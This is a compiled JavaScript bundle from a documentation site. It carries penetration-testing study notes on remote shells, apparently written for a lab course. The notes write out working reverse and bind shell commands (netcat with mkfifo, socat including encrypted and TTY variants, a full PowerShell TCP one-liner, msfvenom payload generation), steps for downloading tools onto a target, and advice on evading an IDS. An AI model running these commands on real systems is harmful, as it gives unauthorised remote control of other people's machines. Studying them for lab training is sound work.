"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[994],{3905:function(e,t,n){n.d(t,{Zo:function(){return p},kt:function(){return d}});var l=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);t&&(l=l.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,l)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function r(e,t){if(null==e)return{};var n,l,a=function(e,t){if(null==e)return{};var n,l,a={},i=Object.keys(e);for(l=0;l<i.length;l++)n=i[l],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(l=0;l<i.length;l++)n=i[l],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var o=l.createContext({}),h=function(e){var t=l.useContext(o),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},p=function(e){var t=h(e.components);return l.createElement(o.Provider,{value:t},e.children)},c={inlineCode:"code",wrapper:function(e){var t=e.children;return l.createElement(l.Fragment,{},t)}},u=l.forwardRef((function(e,t){var n=e.components,a=e.mdxType,i=e.originalType,o=e.parentName,p=r(e,["components","mdxType","originalType","parentName"]),u=h(n),d=a,m=u["".concat(o,".").concat(d)]||u[d]||c[d]||i;return n?l.createElement(m,s(s({ref:t},p),{},{components:n})):l.createElement(m,s({ref:t},p))}));function d(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var i=n.length,s=new Array(i);s[0]=u;var r={};for(var o in t)hasOwnProperty.call(t,o)&&(r[o]=t[o]);r.originalType=e,r.mdxType="string"==typeof e?e:a,s[1]=r;for(var h=2;h<i;h++)s[h]=n[h];return l.createElement.apply(null,s)}return l.createElement.apply(null,n)}u.displayName="MDXCreateElement"},441:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return r},contentTitle:function(){return o},metadata:function(){return h},toc:function(){return p},default:function(){return u}});var l=n(7462),a=n(3366),i=(n(7294),n(3905)),s=["components"],r={},o=void 0,h={unversionedId:"Cibersecurity/Shells",id:"Cibersecurity/Shells",title:"Shells",description:"Shells",source:"@site/docs/Cibersecurity/Shells.md",sourceDirName:"Cibersecurity",slug:"/Cibersecurity/Shells",permalink:"/docs/Cibersecurity/Shells",editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Cibersecurity/Shells.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Passive Reconnaisance",permalink:"/docs/Cibersecurity/Passive Reconnaisance"},next:{title:"THC Hydra",permalink:"/docs/Cibersecurity/THC Hydra"}},p=[{value:"Shells",id:"shells",children:[{value:"Different sources",id:"different-sources",children:[],level:4},{value:"What is a shell?",id:"what-is-a-shell",children:[],level:4},{value:"Types of shell",id:"types-of-shell",children:[],level:4}],level:2},{value:"Netcat",id:"netcat",children:[{value:"Reverse Shells",id:"reverse-shells",children:[],level:3},{value:"Bind Shells",id:"bind-shells",children:[],level:3},{value:"Netcat Shell Stabilitation",id:"netcat-shell-stabilitation",children:[{value:"Technique 1: Python",id:"technique-1-python",children:[],level:4},{value:"Technique 2: rlwrap",id:"technique-2-rlwrap",children:[],level:4},{value:"Technique 3: Socat",id:"technique-3-socat",children:[],level:4}],level:3}],level:2},{value:"Socat",id:"socat",children:[{value:"Reverse Shells",id:"reverse-shells-1",children:[],level:3},{value:"Bind Shells",id:"bind-shells-1",children:[{value:"Socat Encrypted Shells",id:"socat-encrypted-shells",children:[],level:4}],level:3}],level:2},{value:"Common Shell Payloads",id:"common-shell-payloads",children:[],level:2},{value:"Msfvenom",id:"msfvenom",children:[{value:"Metasploit multi/handler",id:"metasploit-multihandler",children:[],level:3}],level:2},{value:"Webshells",id:"webshells",children:[],level:2}],c={toc:p};function u(e){var t=e.components,n=(0,a.Z)(e,s);return(0,i.kt)("wrapper",(0,l.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h2",{id:"shells"},"Shells"),(0,i.kt)("h4",{id:"different-sources"},"Different sources"),(0,i.kt)("p",null,(0,i.kt)("a",{parentName:"p",href:"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"},"PayloadsAllTheThings")),(0,i.kt)("p",null,(0,i.kt)("a",{parentName:"p",href:"https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"},"Reverse Shell Cheat Sheet Pentestmonkey")),(0,i.kt)("p",null,"Kali Linux also comes pre-installed with a variety of webshells located at ",(0,i.kt)("inlineCode",{parentName:"p"},"/usr/share/webshells"),". The ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/danielmiessler/SecLists"},"SecLists repo"),", though primarily used for wordlists, also contains some very useful code for obtaining shells."),(0,i.kt)("h4",{id:"what-is-a-shell"},"What is a shell?"),(0,i.kt)("p",null,"In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI).\nIn simple terms, we can force the remote server to either send us command line access to the server (a ",(0,i.kt)("strong",{parentName:"p"},"reverse")," shell), or to open up a port on the server which we can connect to in order to execute further commands (a ",(0,i.kt)("strong",{parentName:"p"},"bind")," shell)."),(0,i.kt)("h4",{id:"types-of-shell"},"Types of shell"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"Reverse shell:")," the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection."),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"Bind shells:")," the code executed on the target is used to start a listener attached to a shell directly on the target.  This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.")),(0,i.kt)("h2",{id:"netcat"},"Netcat"),(0,i.kt)("p",null,"It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system."),(0,i.kt)("h3",{id:"reverse-shells"},"Reverse Shells"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"nc -lvnp <port-number>\n")),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"-l")," is used to tell netcat that this will be a listener"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"-v")," is used to request a verbose output"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"-n")," tells netcat not to resolve host names or use DNS. "),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"-p")," indicates that the port specification will follows")),(0,i.kt)("h3",{id:"bind-shells"},"Bind Shells"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"nc <target-ip> <chosen-port>\n")),(0,i.kt)("h3",{id:"netcat-shell-stabilitation"},"Netcat Shell Stabilitation"),(0,i.kt)("p",null,"These shells are very unstable by default. Pressing ",(0,i.kt)("inlineCode",{parentName:"p"},"Ctrl + C"),' kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat "shells" really being processes running inside a terminal, rather than being bonafide terminals in their own right.'),(0,i.kt)("h4",{id:"technique-1-python"},"Technique 1: Python"),(0,i.kt)("p",null," Is applicable only to Linux boxes, as they will nearly always have Python installed by default."),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"use ",(0,i.kt)("inlineCode",{parentName:"li"},"python -c 'import pty;pty.spawn(\"/bin/bash\")'"),", qich uses Python to spawn a better featured bah shell (try with ",(0,i.kt)("inlineCode",{parentName:"li"},"python"),", ",(0,i.kt)("inlineCode",{parentName:"li"},"python2"),"or ",(0,i.kt)("inlineCode",{parentName:"li"},"python3"),"). At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell."),(0,i.kt)("li",{parentName:"ol"},(0,i.kt)("inlineCode",{parentName:"li"},"export TERM=xterm"),".  This will give us access to term commands such as ",(0,i.kt)("inlineCode",{parentName:"li"},"clear"),". "),(0,i.kt)("li",{parentName:"ol"},"Finally (and most importantly) we will background the shell using ",(0,i.kt)("inlineCode",{parentName:"li"},"Ctrl + Z"),". Back in our own terminal we use ",(0,i.kt)("inlineCode",{parentName:"li"},"stty raw -echo; fg"),". This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process. ")),(0,i.kt)("p",null,"Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type ",(0,i.kt)("inlineCode",{parentName:"p"},"reset")," and press enter."),(0,i.kt)("h4",{id:"technique-2-rlwrap"},"Technique 2: rlwrap"),(0,i.kt)("p",null,"rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with ",(0,i.kt)("inlineCode",{parentName:"p"},"sudo apt install rlwrap"),".\nTo use rlwrap, we invoke a slightly different listener:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"rlwrap nc -lvnp <port>\n")),(0,i.kt)("p",null,'Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it\'s possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use ',(0,i.kt)("inlineCode",{parentName:"p"},"stty raw -echo; fg")," to stabilise and re-enter the shell. "),(0,i.kt)("h4",{id:"technique-3-socat"},"Technique 3: Socat"),(0,i.kt)("p",null,"Use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets. as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true"},"socat static compiled binary")," (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary ",(0,i.kt)("inlineCode",{parentName:"p"},"sudo python3 -m http.server 80"),", then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget ",(0,i.kt)("inlineCode",{parentName:"p"},"wget <LOCAL-IP>/socat -O /tmp/socat"),". "),(0,i.kt)("p",null,"For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed ",(0,i.kt)("inlineCode",{parentName:"p"},"Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\\\Windows\\temp\\socat.exe"),"."),(0,i.kt)("p",null,"It's useful to be able to change your terminal tty size.\nFirst, open another terminal and run ",(0,i.kt)("inlineCode",{parentName:"p"},"stty -a"),'. This will give you a large stream of output. Note down the values for "rows" and columns.'),(0,i.kt)("p",null,"Next, in your reverse/bind shell, type in: ",(0,i.kt)("inlineCode",{parentName:"p"},"stty rows <number>")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"stty cols <number>"),"."),(0,i.kt)("h2",{id:"socat"},"Socat"),(0,i.kt)("p",null,"Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box."),(0,i.kt)("h3",{id:"reverse-shells-1"},"Reverse Shells"),(0,i.kt)("p",null,"This shell is unestable and equivalent to the netcat one, but will work on either Linux or Windows."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"socat TCP-L:<port> -\n")),(0,i.kt)("p",null,"On Windows we would use this command to connect back:"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes")),(0,i.kt)("p",null,'The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.'),(0,i.kt)("p",null,"This is the equivalent command for a Linux Target:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"\n')),(0,i.kt)("h3",{id:"bind-shells-1"},"Bind Shells"),(0,i.kt)("p",null,"On a Linux target we would use the following command:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'socat TCP-L:<PORT> EXEC:"bash -li"\n')),(0,i.kt)("p",null,"On a Windows target we would use this command for our listener:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"socat TCP-L:<PORT> EXEC:powershell.exe,pipes\n")),(0,i.kt)("p",null,"Regardless of the target, we use this command on our attacking machine to connect to the waiting listener."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"socat TCP:<TARGET-IP>:<TARGET-PORT> -\n")),(0,i.kt)("p",null,"Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux.Here is the new listener syntax:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"socat TCP-L:<port> FILE:`tty`,raw,echo=0\n")),(0,i.kt)("p",null," The target must have socat installed.  it's possible to upload a ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true"},"precompiled socat binary"),", which can then be executed as normal."),(0,i.kt)("p",null,"The special command is as follows:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane\n')),(0,i.kt)("p",null,"This is a handful, so let's break it down."),(0,i.kt)("p",null,"The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  ",(0,i.kt)("inlineCode",{parentName:"p"},'EXEC:"bash -li"'),". We're also passing the arguments: pty, stderr, sigint, setsid and sane:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"pty"),", allocates a pseudoterminal on the target -- part of the stabilisation process"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"stderr"),", makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"sigint"),", passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"setsid"),", creates the process in a new session"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("strong",{parentName:"li"},"sane"),', stabilises the terminal, attempting to "normalise" it.')),(0,i.kt)("p",null,"If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding ",(0,i.kt)("inlineCode",{parentName:"p"},"-d -d")," into the command."),(0,i.kt)("h4",{id:"socat-encrypted-shells"},"Socat Encrypted Shells"),(0,i.kt)("p",null,"Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result."),(0,i.kt)("p",null,"Suffice to say that any time ",(0,i.kt)("inlineCode",{parentName:"p"},"TCP")," was used as part of a command, this should be replaced with ",(0,i.kt)("inlineCode",{parentName:"p"},"OPENSSL")," when working with encrypted shells."),(0,i.kt)("p",null,"We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:\nThis command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt\n")),(0,i.kt)("p",null,"We then need to merge the two created files into a single .pem file:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"cat shell.key shell.crt > shell.pem\n")),(0,i.kt)("p",null,"Now, when we set up our reverse shell listener, we use:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -\n")),(0,i.kt)("p",null,"This sets up an OPENSSL listener using our generated certificate. ",(0,i.kt)("inlineCode",{parentName:"p"},"verify=0")," tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening."),(0,i.kt)("p",null,"To connect back, we would use:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash\n")),(0,i.kt)("p",null,"The same technique would apply for a bind shell:"),(0,i.kt)("p",null,"Target:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes\n")),(0,i.kt)("p",null,"Attacker:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -\n")),(0,i.kt)("p",null,"Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required."),(0,i.kt)("p",null,"This technique will also work with the special, Linux-only TTY shell covered in the previous task"),(0,i.kt)("p",null,"For setting up an OPENSSL-LISTENER using the tty technique."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0\n")),(0,i.kt)("p",null,"To connect back to this listener"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},'socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane\n')),(0,i.kt)("h2",{id:"common-shell-payloads"},"Common Shell Payloads"),(0,i.kt)("p",null," In some versions of netcat  there is a ",(0,i.kt)("inlineCode",{parentName:"p"},"-e")," option which allows you to execute a process on connection. For example, as a listener: ",(0,i.kt)("inlineCode",{parentName:"p"},"nc -lvnp <PORT> -e /bin/bash"),"\nConnecting to the above listener with netcat would result in a bind shell on the target."),(0,i.kt)("p",null," Equally, for a reverse shell, connecting back with ",(0,i.kt)("inlineCode",{parentName:"p"},"nc <LOCAL-IP> <PORT> -e /bin/bash")," would result in a reverse shell on the target."),(0,i.kt)("p",null,"However, this is not included in most versions of netcat as it is widely seen to be very insecure. On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f\n")),(0,i.kt)("p",null,"The command first creates a ",(0,i.kt)("a",{parentName:"p",href:"https://www.linuxjournal.com/article/2156"},"named pipe")," at ",(0,i.kt)("inlineCode",{parentName:"p"},"/tmp/f"),". It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle."),(0,i.kt)("p",null,"A very similar command can be used to send a netcat reverse shell:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f\n")),(0,i.kt)("p",null,"This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax."),(0,i.kt)("p",null,"When targeting a ",(0,i.kt)("strong",{parentName:"p"},"modern Windows Server"),", it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here."),(0,i.kt)("p",null,"This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n")),(0,i.kt)("p",null,"In order to use this, we need to replace ",(0,i.kt)("inlineCode",{parentName:"p"},'"<IP>"')," and ",(0,i.kt)("inlineCode",{parentName:"p"},'"<port>"')," with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell."),(0,i.kt)("h2",{id:"msfvenom"},"Msfvenom"),(0,i.kt)("p",null,"Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly.\nPart of the Metasploit framework, is used to generate code for primarily reverse and bind shells."),(0,i.kt)("p",null,"The standard syntax for msfvenom is as follows: ",(0,i.kt)("inlineCode",{parentName:"p"},"msfvenom -p <PAYLOAD> <OPTIONS>"),"."),(0,i.kt)("p",null,"For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>\n")),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"-f <format>")," specifies the output format"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"-o <file>")," The output location and filename for the generated payload"),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"LHOST=<IP>")," "),(0,i.kt)("li",{parentName:"ul"},(0,i.kt)("inlineCode",{parentName:"li"},"LPORT=<port>"))),(0,i.kt)("h3",{id:"metasploit-multihandler"},"Metasploit multi/handler"),(0,i.kt)("p",null,"The ",(0,i.kt)("inlineCode",{parentName:"p"},"auxiliary/multi/handler")," module of the Metasploit framework is, like socat and netcat, used to receive reverse shells.\nMulti/Handler is a superb tool for catching reverse shells. "),(0,i.kt)("ol",null,(0,i.kt)("li",{parentName:"ol"},"Open Metasploit with ",(0,i.kt)("inlineCode",{parentName:"li"},"msfconsole")),(0,i.kt)("li",{parentName:"ol"},"Type ",(0,i.kt)("inlineCode",{parentName:"li"},"use multi/handler"),", and press enter")),(0,i.kt)("p",null,"Lets look at the available ",(0,i.kt)("inlineCode",{parentName:"p"},"options")," command. There are three options we need to set: ",(0,i.kt)("inlineCode",{parentName:"p"},"payload"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"LHOST")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"LPORT"),". Let's do this by using the ",(0,i.kt)("inlineCode",{parentName:"p"},"exploit -j")," command. This tells Metasploit to launch the module, running as a job in the background. Ww will habe to use ",(0,i.kt)("inlineCode",{parentName:"p"},"sessions")),(0,i.kt)("h2",{id:"webshells"},"Webshells"),(0,i.kt)("p",null,"There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. In these cases we would instead upload a webshell. ",(0,i.kt)("strong",{parentName:"p"},"(Upload Vulnerabilities Room)")))}u.isMDXComponent=!0}}]);